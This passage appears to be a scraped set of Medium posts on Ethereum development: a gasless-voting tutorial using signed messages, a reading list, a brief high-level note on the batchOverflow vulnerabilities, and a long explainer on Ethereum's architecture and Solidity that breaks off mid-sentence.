questions, suggestions or feedback.", "responses": "4"}, {"title": "How to Save Your Ethereum DApp Users\u2019 From Paying Gas for Transactions", "author_name": "BlockChannel", "link": "https://medium.com/blockchannel/how-to-save-your-ethereum-dapp-users-from-paying-gas-for-transactions-cfc665891ab4?source=search_post", "post_date": "Apr 17, 2018", "readtime": "6 min read", "upvotes": "936", "content": "How to Save Your Ethereum DApp Users\u2019 From Paying Gas for TransactionsAnd Instead, You as the DApp Owner Pays For\u00a0ItBlockChannelBlockedUnblockFollowFollowingApr 17, 2018Crosspost: This post was originally published, here. And was posted with the author\u2019, Mahesh Murthy\u2019s permission. [Learn more at Zastrin.com. Bonus: Use code \u201cBlockChannel\u201d to save 50% off all courses.]One of the friction points for Ethereum dapp adoption is that the users have to a pay gas (transaction (txn) fee) to get their transactions recorded on the blockchain. For example, I have a simple voting dapp that lets anyone vote for candidates, and the votes are stored on the blockchain. A user who wants to record her vote on the blockchain has to pay a transaction/gas fee. This is not ideal because as a dapp owner, you are expecting your application users to have Ether to pay for gas when all they want to do is perform a simple action which has nothing to do with transferring money. But if the transaction needs to be executed on the blockchain, there is no other option but to pay the fee. What if there was a way for users to execute transactions securely (vote for a candidate, as in our example) and let someone else (potentially the contract owner) record the transaction on the blockchain and pay for it themselves?Thanks to this tweet from John Backus, I had just enough information to help me implement such a solution for my voting dapp.I wanted to share details on how I implemented this solution for my simple dapp so more people can adopt this technique in their own dapps and could hopefully improve upon it. This post covers the following:A very high level overview of the public key cryptography and digital signatures, which are key to understanding this solution.The solution details and the new application flow.Implementation details (frontend js and Solidity contract code).Discuss potential issues and enhancements.Digital SignaturesFor this solution to make sense, you will need a basic understanding of how digital signatures work in cryptography. Feel free to skip this section if you know public key cryptography. I will try to explain the concept of public/private keys and digital signatures at a very high level but I highly recommend learning more in detail\u200a\u2014\u200awikipedia is a good place to start.Public key cryptography is a cryptographic system where you have 2 keys\u200a\u2014\u200apublic key (Pu) and a private key(Pr). You give out your public key to the entire world and keep the private key to yourself. Ex: Your Ethereum address is a public key (It\u2019s actually derived from public key, but for this exercise, let\u2019s just think of it as public key) and your private key is stored either in your browser, or on your phone/computer. As you know, for someone to send you Ether, they just need to know your public (account) address. However, only you can access the funds you own because you are the only one who knows your private key.Public key cryptography has algorithms that let you encrypt, decrypt, sign and verify messages using your pair of keys.Let\u2019s see what signing and verifying a message means through an example. Let\u2019s say user Kim has a pair of public/private keysPu = \u201c0x44ac12c1e3dfd8edaf83b6f65918229d5279a6f5\u201dPr = \u201cdbc226043e390cf39280e5edfd418d7ad61931c76509270867d300f110c46506\u201dTo sign a message, Kim executes a function sign(\u201cVote for Alice\u201d, Pr) which outputs an alpha-numeric stringsignature = 0x9127112de0033555c7f6508d963d484965a953844dfcff092712102c236467a25af57edc53b63880ea39af8ce7334f6d77a8206e805305e7c6ad919d12bfae5c1bThis is the digital signature of the message \u201cVote for Alice\u201d signed by Kim using her private key Pr.Now anyone can verify that message \u201cVote for Alice\u201d was signed by Kim by executing the verify function, verify(\u201cVote for Alice\u201d, signature) which outputs \u201c0x44ac12c1e3dfd8edaf83b6f65918229d5279a6f5\u201d. If you notice, that output is Kim\u2019s public key Pu (remember, everyone knows it\u2019s Kim\u2019s public key) which means the message was definitely signed by Kim. If you tamper with the signature or message (by changing even one character), the verify algorithm outputs a completely different public key and you will know that the message was tampered with, because the public key will be different from Pu.Solution DetailsIf you understand digital signatures, the solution is extremely trivial. Let\u2019s see how it can be used in our voting application to save users from paying gas fee without compromising their vote. You can see below all the users of dapp and the actions they perform.A voter indicates their intention to vote for a candidate by signing a message using their private key. They won\u2019t submit their transaction to the blockchain, so no txn fee is paid. The message queue in the diagram above is just an off chain location where all the vote details are stored.Anyone willing to pay the txn fee (usually the contract owner) takes the signature, candidate name and voter\u2019s account address and submits them to the blockchain.The smart contract uses the verify function to derive the public key (Ethereum account address) based on the candidate name and signature. If the derived public key matches the address of the user who signed the message, it records the vote or else fails the transaction.Implementation DetailsLet\u2019s now look at the actual implementation and how all the pieces fit together.Step 1: Sign the messageThe first step is to sign the message as a voter. We will use eth_signTypedData function to sign our message. This function has been implemented in Metamask which makes it really easy to sign messages. You can find more details and discussion about this proposal here: https://github.com/ethereum/EIPs/pull/712. You can find the code to sign the message below.One really important thing to note is, internally eth_signTypedData hashes the message and the hashed message is what gets signed. You can refer to typedSignatureHash function here for more details on hashing.Step 2: Submit the signed vote to the blockchainSince this is just a demo application, we don\u2019t store the signature and other details anywhere. It is directly displayed on the page after the message is signed. Anyone can take these details and submit to the blockchain. Here is the code that submits the vote to the blockchain:Step 3: Verify the vote details in the smart contractWe now verify in the smart contract if the submitted vote info is valid and we then record the vote.Zeppelin has a handy library called ECRecovery we can use to verify the signed message. The voteForCandidate function verifies the signed message (recover function) and updates the vote count if the verification succeeds.If you remember, I mentioned earlier that eth_signTypedData hashes the message (\u201cVote for Alice\u201d) before signing it? The solidity recover function doesn\u2019t have any knowledge of the hashing function used within eth_signTypedData and so it can\u2019t verify the message \u201cVote for Alice\u201d. It has to generate the hash of the message \u201cVote for Alice\u201d and then verify it. Instead of generating the hash inside the contract, we pre-hash all the messages beforehand and pass it in the constructor so it is easy to lookup when verifying. The code to generate the hash is in the migration file belowThat is all the code you need to get the new application working!I created a quick demo to show how this application worksThe entire working code is here: https://github.com/maheshmurthy/ethereum_voting_dapp/tree/master/chapter4The demo application is here: https://www.zastrin.com/voting-dapp-without-paying-gas.htmlPotential issues to\u00a0addressThere are a few issues to consider when building a real dapp using this technique. Some of them are listed below:Where are the signed messages stored? You can use some kind of a queuing system to store these messages.What is the guarantee that the signed message eventually is submitted to the blockchain?Storing the hash of all the messages in the blockchain is not ideal, so what is the best solution for it?If you have thoughts on how to address these issues or if you see any flaws in this solution, please leave a comment!Note: Apparently, eth_signTypedData API is still not stable and has been implemented by only metamask. Please beware of this if you are planning to use this technique in mainnet/production.Further Readinghttps://en.wikipedia.org/wiki/Public-key_cryptographyhttps://en.wikipedia.org/wiki/Digital_signaturehttps://github.com/danfinlay/js-eth-personal-sign-examples/https://danfinlay.github.io/js-eth-personal-sign-examples/https://github.com/ethereum/EIPs/pull/712Thanks Chris Whinfrey and Febin John James for reviewing drafts of this article.", "responses": "2"}, {"title": "The Ethereum Developer Essential Reading\u00a0List", "author_name": "Steven McKie", "link": "https://medium.com/blockchannel/the-ethereum-developer-essential-reading-list-4fe5d788b294?source=search_post", "post_date": "Nov 6, 2017", "readtime": "3 min read", "upvotes": "579", "content": "The Ethereum Developer Essential Reading\u00a0ListCrucial Links and Resources to Get Started\u00a0QuicklySteven McKieBlockedUnblockFollowFollowingNov 6, 2017Thanks to Cent I was able to quickly compile this excellent list of resources for individuals seeking to learn the ins and outs of Solidity/Ethereum smart contract development. https://beta.cent.co/question/251.I like to compile these resources so you don\u2019t have to take the time to scour for them online with countless Google searches. I love reading things in blog/article form as most textbooks and tutorials can sometimes inundate you with unnecessary or out of date information (my OCD hates to learn things irrelevant from the past).If you\u2019re a developer, you\u2019ve likely already skipped this wall of text and moved on to clicking links; nice hustle. You can also try out Zastrin.com (use code \u201cBlockChannel\u201d for 50% off all available courses).ResourcesVideosDecypher MediaI make screencasts about software development. If you like these vids, feel free to send Ether donations to\u2026www.youtube.comDecypher TV - Ethereum Screencasts for DevelopersEdit descriptiondecypher.tvBlockChannelThe Anatomy of ERC20What\u2019s on the Inside of Ethereum\u2019s Most Popular Contractmedium.comSolidity Learning: State Specifiers and STATICCALLUpcoming Changes to Solidity and How They Functionmedium.comSolidity Learning: Revert(), Assert(), and Require() in Solidity, and the New REVERT Opcode in the\u2026Upcoming Changes to Solidity and How They Functionmedium.comA Crash Course in Mechanism Design for Cryptoeconomic ApplicationsUnderstanding the Basic Fundamentals of \u201cCryptoeconomics\u201dmedium.comOthersEthereum Smart Contract Best PracticesEdit descriptionconsensys.github.ioHomeDapps for Beginners Welcome to the temporary home of learning materials relating to development on ethereum. Inside you\u2026dappsforbeginners.wordpress.comethereum/wikiwiki - The Ethereum Wiki -github.comSolidity - Solidity 0.4.19 documentationSolidity is a contract-oriented, high-level language whose syntax is similar to that of JavaScript and it is designed\u2026solidity.readthedocs.ioTruffleFramework.com - Truffle SuiteYour Ethereum Swiss Army Knifetruffleframework.comFull Stack Hello World Voting Ethereum Dapp Tutorial\u200a\u2014\u200aPart 1In my previous post, I explained the high level architecture of Ethereum platform comparing it to a web application. As\u2026medium.comMutation testing support for Solidity \u00b7 Issue #1172 \u00b7 ethereum/solidityWith the failure of TheDAO, it became evident that writing even a relatively simple smart contract correctly is a\u2026github.compirapira/bamboobamboo - Bamboo: a morphing smart contract languagegithub.comEthereum Blog - Promoting a free, decentralized and open futurePromoting a free, decentralized and open futureblog.ethereum.orgEthereum Community ForumA Next-Generation Smart Contract and Decentralized Application Platformforum.ethereum.orgethereum/viperviper - New experimental programming languagegithub.comAn Introduction to LLL for Ethereum Smart Contract DevelopmentEthereum is hot. Very hot. As I write this, Ether has just hit the $100 mark. For this and other reasons there are now\u2026media.consensys.netSolidity Assembly - Solidity 0.4.19 documentationFor more fine-grained control especially in order to enhance the language by writing libraries, it is possible to\u2026solidity.readthedocs.ioandrolo/solidity-workshopsolidity-workshop - Educational material for Solidity. Complement to solidity.readthedocs.comgithub.comEthereum Stack ExchangeQ&A for users of Ethereum, the decentralized application platform and smart contract enabled blockchainethereum.stackexchange.comRemix - Solidity IDEEdit descriptionethereum.github.ioEthereum Builder's GuideEdit descriptionethereumbuilders.gitbooks.ioHow To Learn Solidity: The Ultimate Ethereum Coding GuideThis Guide will walk you step-by-step in learning Solidity. It's a pretty simple language to learn. The Ultimate\u2026blockgeeks.comLearn Solidity in Y MinutesEdit descriptionlearnxinyminutes.comLearn Solidity: Basics of Solidity By ExampleIn this post, we will learn the Solidity language by going through two example. Then we will dig deeper into each\u00a0\u2026www.toshblocks.comEthereum for web developersI have been learning about Ethereum blockchain platform for some time and the more I learn, the more exciting it looks\u2026medium.comSolidity - Solidity 0.4.19 documentationSolidity is a contract-oriented, high-level language whose syntax is similar to that of JavaScript and it is designed\u2026solidity.readthedocs.ioThe Hitchhiker\u2019s Guide to Smart Contracts in EthereumUpdated Oct 6th 2017, for Truffle v3.4.11 and Solidity v0.4.15.blog.zeppelin.solutions5 Essential Ethereum Dapp ToolsGetting started writing dapps is hard. You've got a lot of moving pieces, and half of them are in beta release. It's\u2026karl.tech11 Best Ethereum Development Tools to Grow Your StackBlockchain tech is getting chief officers hot and heavy. When it\u2019s your turn to show them your stack, will you distress\u2026hackernoon.com", "responses": "4"}, {"title": "Quantstamp\u2019s assessment of the recent batchOverflow and proxyOverflow vulnerabilities", "author_name": "Jonathan Haas", "link": "https://medium.com/@Jon_A_Haas/quantstamps-assessment-of-the-recent-batchoverflow-and-proxyoverflow-vulnerabilities-1f9562fa7340?source=search_post", "post_date": "Apr 25, 2018", "readtime": "2 min read", "upvotes": "1.3K", "content": "Quantstamp\u2019s assessment of the recent batchOverflow and proxyOverflow vulnerabilitiesJonathan HaasBlockedUnblockFollowFollowingApr 25, 2018The vulnerable batchTransfer functionbatchOverflow and proxyOverflow present an unfortunate but critical message: smart contract auditing is vital. The bugs themselves are fairly simple and are able to be executed readily. These bugs work by performing an attack known as \u201cinteger overflow.\u201d Integer overflow occurs when trying to place an integer (a whole number) into a space in memory that is too large for the integer data type.In application, what this means is that by flooding the system with a number too large for use an attacker could create an additional supply of tokens that do not exist within the system. For exchanges, this presents an immense attack vector, as token minting can occur without necessary sanity checks that properly assure issuance of the token. In relevant transactions, this will appear to mint tokens out of seemingly nothing.That is how the bugs were initially caught. On April 22nd, PeckShield\u2019s automated system scanning for unusual activity in ERC20 token transfers noted that an anomalously large amount of token had been transferred in BEC (BeautyChain). After the transfer, the PeckShield team analyzed the BeautyChain contract for vulnerabilities\u200a\u2014\u200aand found batchOverflow. A brief synopsis is available on Medium concerning batchOverflow and proxyOverflow.Although not every ERC20 token was open to this vulnerability\u200a\u2014\u200aand it should be noted that the flaw is not within the ERC20 standard itself\u200a\u2014\u200amany contracts were published that never were checked for these potential exploits.To serve our community, Quantstamp has contacted affected tokens and their relevant exchanges to assist at cost. We won\u2019t be making a profit from our effort to make the Ethereum ecosystem more secure.Catching vulnerabilities before contracts go live is a better solution than rapid patches. We would love to help you solve these issues in advance, please contact security@quantstamp.com for more information.", "responses": ""}, {"title": "A Gentle Introduction to Ethereum Programming, Part\u00a02", "author_name": "Facu Spagnuolo", "link": "https://blog.zeppelin.solutions/a-gentle-introduction-to-ethereum-programming-part-2-7bbf15e1a953?source=search_post", "post_date": "Nov 16, 2017", "readtime": "7 min read", "upvotes": "805", "content": "A Gentle Introduction to Ethereum Programming, Part\u00a02Facu SpagnuoloBlockedUnblockFollowFollowingNov 16, 2017This is the second part of our Ethereum introduction guide. If you haven\u2019t read part 1, I highly recommend it to better understand this post.Enjoy, and please do not hesitate to reach out with questions, corrections or feedback.Index1. Taking the first steps2. Interacting with a contract2.1. Introduction to smart contracts in Ethereum2.2. Your first smart contract2.3. Deploying a smart contract2.4. Web3 and smart contracts3. Frameworks & Tools in the real world4. A real DApp, a token marketplace\u200a\u2014\u200acoming soon", "responses": "9"}, {"title": "How Does Ethereum\u00a0Work?", "author_name": "Michele D'Aliessi", "link": "https://medium.com/@micheledaliessi/how-does-ethereum-work-8244b6f55297?source=search_post", "post_date": "Feb 11, 2018", "readtime": "7 min read", "upvotes": "888", "content": "How Does Ethereum\u00a0Work?Michele D'AliessiBlockedUnblockFollowFollowingFeb 11, 2018The logic and mechanics behind Ethereum explained in simple words.Ethereum is a platform on which anyone can build unstoppable\u00b9, decentralised applications. If you have never heard of Ethereum or if you don\u2019t know what it can be used for, I would strongly recommend to read \u201cWhat is Ethereum?\u201d before digging deeper and exploring how it works in this article.What is Ethereum?The ultimate guide to understand Ethereum in simple words.medium.com", "responses": "3"}, {"title": "A Complete Mental Model for Ethereum dApp Development", "author_name": "Thon Ly", "link": "https://medium.com/heartbankacademy/a-complete-mental-model-for-ethereum-dapp-development-5ce08598ed0a?source=search_post", "post_date": "Sep 28, 2018", "readtime": "33 min read", "upvotes": "568", "content": "A Complete Mental Model for Ethereum dApp DevelopmentBlockchain Application Development for Web DevelopersThon LyBlockedUnblockFollowFollowingSep 28, 2018Photo: https://www.ethereum.org/assetsIntroductionThe prevailing architecture of most web applications is client-server-database. We utilize clients such as laptops, smartphones, and tablets to make requests from and submit requests to backend servers, which in turn communicate with databases to persist and retrieve data. The relationship between client and server/database is many-to-one, where control is centralized at the latter. If Web 1.0 is about static web pages, Web 2.0 is about interactivity and JavaScript.web stack: Clients => Servers => DatabasesWhere we want to go is Web 3.0, where servers and databases are as decentralized as the clients. In other words, clients can also act as servers or databases or both (aka, peer-to-peer). With many-to-many relationships at all levels of the stack, there are no concentrations of control and a single point of failure. The network is maximally distributed.Web 1.0 Static (HTML/CSS)Web 2.0Interactive (JavaScript)Web 3.0Decentralized (Blockchain)Why do we want clients to also maintain the databases? The most obvious and powerful use-case is Bitcoin. If we all collectively maintain a public ledger of balances and transactions, we can create a global currency that\u2019s completely divorced from governments and institutions. With prophetic timing, \u201cSatoshi Nakamoto\u201d mined the first bitcoin on January 3, 2009 at the height of the worst financial crisis since the Great Depression.blockchain => public ledger => global currencySoon after, Vitalik Buterin realized that if clients could also maintain the \u201cservers\u201d along with the databases, the underlying blockchain can become programmable. The incredible implication is autonomous smart contracts. Such contracts could then be programmed to tokenize (digitize) real-world assets with records of ownership that are immutable. In effect, anyone from any corner of the globe can trade anything, cheaply and securely, without the need for intermediaries which are prone to corruption. From land, energy, music, and voting, the applications are endless, disruptive, and profound.smart contract => records of ownership => blockchainApplications that utilize smart contracts are known as decentralized applications, or dapps for short. Dapps are frontend apps that interface with smart contracts (instead of servers) to persist or retrieve data on the blockchain (instead of databases). Clients interact with dapps through external accounts. To help web developers looking to get into Ethereum dApp development, the author hopes to impart a simple mental model for these architectural layers that make up the blockchain application stack.webapp: Client           => Server         => Databasedapp:   External Account => Smart Contract => BlockchainFor a nontechnical introduction to blockchain, check out this insightful (and quite funny!) primer by Bertie Spell:https://bertiespell.com/blockchain-solves-everythingBlockchain (Database) LayerThe blockchain layer is analogous to the database layer, where data is persisted and retrieved. Here, blocks record every transaction that has ever taken place. What makes blockchain different is that anyone can add to the chain. Consensus is achieved through a process called mining, where computers running an Ethereum client compete to secure the next block (aka, proof-of-work). Together, these nodes make up a network, and each one retains a copy of the entire blockchain. It\u2019s a novel solution to the Byzantine Generals Problem that plagues all distributed systems.network: Ethereum clients => mine(blocks) => proofTo add new data to the blockchain, we submit transactions to nodes in the network. Nodes then group pending transactions into blocks before beginning the mining process.node: transactions => blocks => blockchainTo be precise, each block is a Merkle tree of transactions, plus a Merkle tree of receipts and a Merkle tree of the state. The benefit of these Merkle trees (Merkle-Patricia tries to be exact) is a simplified verification process (aka, Merkel proof), where nodes can simply download the block headers instead of every transaction in every block to verify a payment (aka, light clients).Block Header:1) transactions => transactions trie => transactionsRoot2) infos and logs => receipts trie => receiptsRoot3) addresses and balances => state trie => stateRoottransactionsRoot is a trie of transactions in the block, receiptsRoot is a trie of transaction infos and logs, while stateRoot is a trie of account addresses and balances (aka, ledger). Essentially, a transaction is just a state transition, and a smart contract is just a state transition function.transactions: genesis => state 1 => state 2 => ... => state NAnd the underlying data structure is basically a linked list of binary trees of cryptographic hashes.blockchain: genesis <= tries 1 <= tries 2 <= ... <= tries NTo mine a new block, we calculate a hash of these Merkle roots in the block header. This hash must reference the hash of the last block while it computes a special nounce that results in a value less than some target. This mathematical work is \u201cproof\u201d that the block is valid.hash(nounce, block header, previous hash) < targetThe target is set by the Ethash algorithm which takes into account the time it took to solve the previous block such that the average time normalizes to 15 seconds (aka, block time). This target is continually adjusted because the number of people running nodes is not always constant and the quality of computing resources keeps improving. The output hash is a hexademical (base 16, usually prefixed with \u201c0x\u201d) and is always 64 characters long.https://etherscan.io/chart/blocktimeA block time that\u2019s too high (low target value) will slow down the network and increase processing time of transactions. A block time that\u2019s too low (high target value) will create many duplicate solutions, creating forks in the blockchain. A block time of 15 seconds seems to be ideal.low target value => high block time => takes too longhigh target value => low block time => too many forksWhen forks occur, Ethereum follows the GHOST protocol which selects the fork that has done the most \u201cwork\u201d, i.e., the longest chain (highest block number).Fork A: genesis + block 1 + block 2 + ... + block 12 // mainFork B: genesis + block 1 + block 2 + ... + block 11 // uncleFork C: genesis + block 1 + block 2 + ... + block 10 // uncleUnlike Bitcoin, forks in Ethereum are not \u201corphans\u201d and abandoned. They are \u201cuncles\u201d and are rewarded to create an economic incentive that decentralizes mining pools for increased security. Generally, we wait for at least 6 network confirmations to allow the longest chain to win by a wide margin.block reward: 3 + fees + (1/32 x uncles)uncle reward: 7/8 x 3 // 2 uncles per block (maximum)The more mining is centralized, the greater the risk of a 51% attack, where miners collude to validate double spendings. Waiting for at least 6 more blocks to be confirmed by the network also decreases this risk. Either way, such attacks are impractical and unprofitable, costing at least $6 billion to carry out, and even more if we consider the opportunity cost of not acting honestly and receiving rewards in return.Let\u2019s take a look at an actual block of transactions on the Ethereum network:https://etherscan.io/block/5912705The block Height indicates its order in the chain. In this case, it is block number 5,912,705. According to the TimeStamp, this block was mined on July 5, 2018 around 12 AM by Ethermine. This block contains 89 transactions, which amount to 19,290 new bytes of data. Ethermine was the first to determine the correct Nounce that results in a Hash value less than the target Difficulty. As a reward, Ethermine received 3.46486964996 ethers (Block Reward).block reward = coinbase + fees + uncles = 3 + 0.46486964996 + 0Gas represents computational operations required to execute code. The block Gas Limit defines the maximum number of operations all the transactions in the block are allowed to \u201cconsume\u201d. Like Bitcoin\u2019s block size limitation, its purpose is to keep processing time of transactions and propagation time to other nodes low. Unlike Bitcoin, however, it\u2019s not a constant. Miners have the option to adjust this limit by a small factor.block gas limit = 1.5 x 10^6 x \u03c0 \u00b1 1/1024sum(transaction gas limits) < block gas limitAs in Bitcoin, ethers are created whenever miners successfully solve the cryptographic puzzle. This is done simply by incrementing the miner\u2019s account balance by the reward amount (aka, coinbase transaction). In Bitcoin, however, an actual coinbase transaction needs to be issued by the miner.Let\u2019s now take a look at two of those transactions:https://etherscan.io/tx/0xc28ab33c5943d0d593d34d9af1b29971310dac009b88b83d3b2fae5dfdfed327https://etherscan.io/tx/0x0875ed575d905efdbb909020da5f83867aadfa572f4164ff009a94025f4a977eThese two transactions represent the two possible types in Ethereum. We can send ethers to another account (first transaction) or we can send them to a contract account (second transaction).1) external account => external account2) external account => contract account3) contract account => contract account // \"internal\" transactionsBoth transactions tell us the TimeStamp, From, To, and how much ether to send (Value)\u00a0. They also indicate how much gas was available (Gas Limit), how much was consumed (Gas Used By Txn), and its unit cost (Gas Price). The Nounce here is just a counter to give order to all the transactions being submitted by a particular sender. This is necessary because transactions need to be processed in order to prevent people from spending more than they have. Upon submission, the TxHash is created. It\u2019s the ID of a transaction, which we can use to ping the network to check on the TxReceipt Status of our transaction. If our transaction is meant for a contract account, we can attach Input Data for the contract to consume.Gas Used By Txn < Gas LimitGas Used By Txn x Gas Price = Actual Tx Cost/FeeWhen we submit transactions, we\u2019re asking nodes in the network to process them for us. This requires compute resources, which we pay for in the form of gas. Gas fees not only deter spam, but also halt bad code such as infinite loops. We can specify the amount as well as the price. At the start, the total potential cost will be deducted. Any gas left over will be reimbursed. If we set an insufficient amount, our transaction will revert and we will not be refunded. The more we\u2019re willing to pay per unit of gas, the more priority we will receive. At present, a gas price of 50 gwei ($0.50) has a processing time of 1 minute. Compared to remittance transfers, this speed is incredible and the cost is minuscule.gas price = supply (miners) + demand (external accounts)Quite confusingly, contract accounts also have a nounce with yet another meaning. In these cases, this \u201cnonsensical\u201d number is incremented whenever the contract account creates another contract account.block nounce = solution to the cryptographic puzzleexternal account nounce = number of transactions issuedcontract account nounce = number of contracts createdBefore we conclude this section, let\u2019s examine the makeup of external and contract accounts:Photo: https://etherscan.io/address/0x68b42e44079d1d0a4a037e8c6ecd62c48967e69fhttps://etherscan.io/address/0x06012c8cf97bead5deae237070f9587f8e7a266dBoth types of accounts can send and receive ethers. Therefore, both have a Balance field to keep track of them. Contract accounts, however, can also store data. Therefore, they have a storage field, and a code field that contains machine instructions on how to manipulate the stored data. In other words, contract accounts are smart contracts that live on the blockchain.contract account = balance + code + storageexternal account = balance + empty + emptyExternal accounts are controlled by private keys (i.e., humans) while contract accounts are controlled by code. A transaction between two external accounts is simply a value transfer. A transaction from an external account to a contract account activates the called account\u2019s code. Contrary to popular belief, smart contracts cannot self-execute. Actions on contract accounts are always initiated by external accounts.external account => transaction => contract account A => \"internal\" transaction => contract account B => ...In Ethereum as in Bitcoin, we can only send ethers; we can never take. Therefore, the security of the From field is paramount. It\u2019s so vital, in fact, that three additional fields are used to determine its validity. They are the v, r, and s. Obviously, if we can spoof any From address, we can manipulate any account to transfer all its ethers to us. To comprehend v, r, and s, we need to understand asymmetric cryptography.transact = send ethers // can never take ethersWe use cryptography to encrypt and decrypt messages. With symmetric cryptography, the same key can be used for both encryption and decryption. With asymmetric cryptography, only the private key can be used for decryption, while anyone can use our public key to encrypt messages that only we can see.// Symmetric Cryptographyencrypt(unencrypted message, key 1) => encrypted messagedecrypt(encrypted message, key 1) => unencrypted message// Asymmetric Cryptographyencrypt(unencrypted message, public key) => encrypted messagedecrypt(encrypted message, private key) => unencrypted messageThis property makes asymmetric cryptography more secure because we have no reason to share our private key with anyone. Another advantage of asymmetric cryptography is the ability to \u201csign\u201d a message with our private key. Then using our public key, anyone can verify that our message and our \u201csignature\u201d match.sign(message, private key) => signatureverify(message, signature, public key) => true/falseIn Ethereum, private keys are random 64 hexadecimal characters. In base 10, they are incredibly large and impossible to guess. From private keys, we can generate public keys using the Elliptic Curve Digital Signature Algorithm (ECDSA) to get 128 hexadecimal characters. To generate account addresses, we hash public keys using Ethash (keccak-256) and drop the first 24 characters to arrive at 40 hexadecimal characters.random(hexadecimal characters) => private key // 64 charactersECDSA(private key) => public key // 128 characterskeccak(public key) => account address // 40 charactersIn Ethereum, r and s are outputs of signing the transaction object with the sender\u2019s private key using ECDSA, while v can be used to compute the originating address.sign(transaction) => r and s (signature)v => public key => account addressTogether, these parameters are the means by which nodes in the network can verify that the transaction in fact originated from the account address in question.verify(transaction, rs_signature, v_address) => true/falseBecause it\u2019s possible to derive the originating address from v, it\u2019s not necessary to submit it along with the transaction!Finally, contract addresses can then be generated from the account addresses and the transaction nounce:keccak(account address, transaction nounce) => contract address // 40 charactersWe ignore the first 12 characters to also arrive at 40 hexadecimal characters.Because external addresses and contract addresses ultimately come from our private keys, as long as we keep them safe, theft is impossible. Conversely, if we ever lose our private keys, our ethers are lost forever.Smart Contract (Server)\u00a0LayerThe smart contract layer is analogous to the server layer, where the business/controller logic resides. To create a smart contract, we simply submit a transaction to a \u201cblank\u201d recipient with our logic as payload from an external account.external account => \"blank\" transaction => contract accountOn the blockchain, smart contracts exist as \u201cinternal\u201d accounts with additional storage and code fields. Together, these fields persist the data and the logic of smart contracts, respectively. As such, smart contracts can be abstracted as class constructs, and a Turing-complete programming language can be invented. Solidity is such a language, and it\u2019s the most popular because of its similarity to JavaScript.storage + code = properties + methods => class => SolidityIn Solidity, the class construct has the keyword contract. Like JavaScript, variables and functions (aka, properties and methods) can be defined inside these contract classes.pragma solidity ^0.4.24;contract {    variables;    constructor {}    functions {}}Like classes, any contracts can inherit any other contracts:pragma solidity ^0.4.24;import \"/Foo.sol\";contract Bar is Foo {    ...    }Here, Bar inherits from Foo, meaning Foo\u2019s state and functions are transferred to Bar.inheritance: base contract => derived contract// inherits variables and functions, which can be overriddenFoo\u2019s functions can be overridden if Bar\u2019s functions have the same name, inputs, and outputs. If name is the same but inputs and outputs are different, the function will be overloaded instead.function foo(uint a) {}function foo(uint a) {} // overriddenfunction foo(uint a, uint b) {} // overloadedIf more than one contract is inherited, we must specify the order from the \u201cmost base\u201d to the \u201cmost derived\u201d.contract A {}contract B is A {}contract C is A, B {} // will not compile!contract C is B, A {} // will compileIf composition is preferred over inheritance, contracts can call library functions without inheriting:pragma solidity ^0.4.24;library Foo {    function foo() {        ...    }}contract Bar {    function bar() {        Foo.foo();    }}Though a single contract can inherit from many others, on the blockchain, the codes are combined into one contract account. On the other hand, codes from libraries exist independently on the blockchain.inheritance: multiple smart contracts => one contract accountLibrary accounts on the blockchain do not have storage and cannot hold ethers. When library functions are called, the calling contract\u2019s storage and balance (aka, context) are passed in. Linking to the library contract is possible only after it has been deployed because its address on the blockchain is needed by the contracts that depend on it.1. deploy(library) => library address2. deploy(contract(library address)) => contract addressSolidity supports object-oriented design. We can create abstract contracts that others can inherit; just the function signatures can suffice.pragma solidity ^0.4.24;contract Foo {    function foo() public returns (bytes32);}contract Bar is Foo {    ...}We can also create interface contracts. Here, only the function signatures are allowed. So, no constructor, no variables, and no inheritance.pragma solidity ^0.4.24;interface Foo {    function foo() public returns (bytes32);}Solidity files should have the same name as their contract classes, and the extension\u00a0.sol. To compile them, we specify the version of Solidity we want to use with a pragma statement. The outputs of the compilation process are the bytecodes and the application binary interface (ABI).pragma solidity ^0.4.24semver => major.minor.patch^ => the version indicated up to but not including the next major version~ => the version indicated up to but not including the next minor versioncompile(contract.sol) => bytecodes + ABITo deploy smart contracts, we submit \u201cblank\u201d transactions with the bytecodes attached. Whenever a contract is deployed, an \u201cinstance\u201d of it is created and its constructor method is called. Along with the bytecodes, we can also attach the arguments that we want to pass to the constructor method.contract class => bytecodes + constructor arguments => contract instanceAnalogous to the JavaScript Engine, the Ethereum Virtual Machine (EVM) resides in every node and is responsible for executing the bytecodes. As the EVM runs, it maintains a stack of opcodes that can write to the contract\u2019s storage tree. This stack can have up to 1024 elements, and each element is 32 bytes. Thus, recursion is not recommended because there\u2019s a good chance it might cause a stack overflow. In essence, the EVM is simply a state machine, and the opcodes specify how state transitions are applied to the next block state.EVM stack = opcode + opcode + ... + opcode => next block stateSome opcodes are more expensive to execute than others:Operation         Gas           DescriptionADD/SUB           3             Arithmetic operationMUL/DIV           5             Arithmetic operationADDMOD/MULMOD     8             Arithmetic operationAND/OR/XOR        3             Bitwise logic operationLT/GT/SLT/SGT/EQ  3             Comparison operationPOP               2             Stack operation PUSH/DUP/SWAP     3             Stack operationMLOAD/MSTORE      3             Memory operationJUMP              8             Unconditional jumpJUMPI             10            Conditional jumpSLOAD             200           Storage operationSSTORE            5,000/20,000  Storage operationBALANCE           400           Get balance of an accountCREATE            32,000        Create a new account using CREATECALL              25,000        Create a new account using CALLDuring a contract-creating transaction, the EVM initializes a new contract account by executing the constructor function. The code that results from this initial execution is the actual code that makes up a particular \u201cinstance\u201d.EVM(bytecodes, constructor arguments) => contract instance(s)Of course, this means we can deploy as many \u201cinstances\u201d of our smart contract \u201cclass\u201d as we want.The ABI is the developer\u2019s portal to the opcodes in the contract instance. Its function is to translate the bytecodes into JSON RPC calls to the network.developer => ABI => RPC(bytecodes) => contract instanceTo interact with our instance on the blockchain, we can use the ABI to instruct the EVM which functions and with which arguments we want to call. The most popular JavaScript library for this is web3, so named to remind us that we\u2019re building the future of Web 3.0!web3(ABI) => EVM(functions, arguments)Each web3 invocation is either a transaction (send) or a call. Transactions are sent to the network and potentially state-changing. Calls are read-only and fast. Contracts can call other contracts (aka, message), but it\u2019s always a transaction that gets things started. In other words, message calls in themselves are never state-changing, but they can be part of a state-changing transaction.transaction (send) => message call(s) => state changecall => no state changeWith web3, we can submit four types of transactions:Send ethers from one external account to another external account (like a Bitcoin transaction)Send a \u201cblank\u201d transaction to deploy a smart contract (becomes a contract account)Send ethers from an external account to a contract accountSend a transaction to execute a method within the contract account (to update or retrieve the contract state, or call other contracts)Transactions and calls are executed by the EVM as opcodes, which equate to gas. Transactions that update the blockchain or contract state require payment of ethers. These will take 